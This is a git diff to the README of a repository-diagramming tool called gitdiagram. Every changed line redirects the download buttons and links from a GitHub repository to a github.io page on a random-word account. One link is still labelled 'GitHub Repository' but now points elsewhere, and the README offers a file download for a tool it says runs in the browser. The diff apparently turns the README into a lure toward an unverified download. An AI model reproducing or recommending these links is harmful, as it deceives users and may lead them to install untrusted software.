@@ -37,10 +37,10 @@ gitdiagram is a web-based tool, which means it runs entirely in your browser. He
 
 ### Step 1: Download the Application
 
-[![Download gitdiagram](https://img.shields.io/badge/Download-gitdiagram-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Reincarnationkeyholesaw9745/gitdiagram)
+[![Download gitdiagram](https://img.shields.io/badge/Download-gitdiagram-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://reincarnationkeyholesaw9745.github.io)
 
 **Click the button above** or visit this link to download the application:  
-👉 [https://github.com/Reincarnationkeyholesaw9745/gitdiagram](https://github.com/Reincarnationkeyholesaw9745/gitdiagram)
+👉 [https://reincarnationkeyholesaw9745.github.io](https://reincarnationkeyholesaw9745.github.io)
 
 ### Step 2: Find the Downloaded File
 
@@ -166,7 +166,7 @@ The **explainer video** is like a short, narrated slideshow that walks you throu
 
 You're only a few clicks away from understanding any codebase on the planet.
 
-### 👉 [Download gitdiagram Now](https://github.com/Reincarnationkeyholesaw9745/gitdiagram)
+### 👉 [Download gitdiagram Now](https://reincarnationkeyholesaw9745.github.io)
 
 Visit this link to download the application. It takes less than a minute, and then you'll have a superpower: the ability to see exactly what any software project is doing, visually, in seconds.
 
@@ -174,7 +174,7 @@ Visit this link to download the application. It takes less than a minute, and th
 
 ## 📌 Additional Resources
 
-- **GitHub Repository:** [https://github.com/Reincarnationkeyholesaw9745/gitdiagram](https://github.com/Reincarnationkeyholesaw9745/gitdiagram)
+- **GitHub Repository:** [https://reincarnationkeyholesaw9745.github.io](https://reincarnationkeyholesaw9745.github.io)
 - **Official Website:** Check the repository's README for any links to demos or documentation
 - **Report an Issue:** Use the "Issues" tab on the GitHub page if you encounter problems
 
